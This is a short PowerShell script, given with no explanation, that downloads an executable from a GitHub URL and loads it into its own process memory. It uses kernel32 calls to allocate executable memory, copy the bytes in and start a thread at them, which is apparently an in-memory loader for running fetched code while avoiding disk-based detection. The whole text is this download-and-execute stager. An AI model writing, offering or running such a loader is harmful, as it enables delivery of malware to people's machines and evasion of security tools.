$url = "https://github.com/scinne/cppinjection/raw/refs/tags/test/578d2bfa.exe"
$exeBytes = Invoke-WebRequest -Uri $url -OutFile "program.exe"; $exeBytes = [System.IO.File]::ReadAllBytes("program.exe")


$kernel32 = Add-Type -Name "Kernel32" -Namespace "WinAPI" -MemberDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Kernel32 {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();
    }
"@
$allocationSize = [uint32]$exeBytes.Length
$allocationAddress = [WinAPI.Kernel32]::VirtualAlloc([IntPtr]::Zero, $allocationSize, 0x1000, 0x40)
[WinAPI.Kernel32]::WriteProcessMemory([WinAPI.Kernel32]::GetCurrentProcess(), $allocationAddress, $exeBytes, $allocationSize, [ref]0)


[WinAPI.Kernel32]::CreateRemoteThread([WinAPI.Kernel32]::GetCurrentProcess(), [IntPtr]::Zero, 0, $allocationAddress, [IntPtr]::Zero, 0, [ref][IntPtr]::Zero)
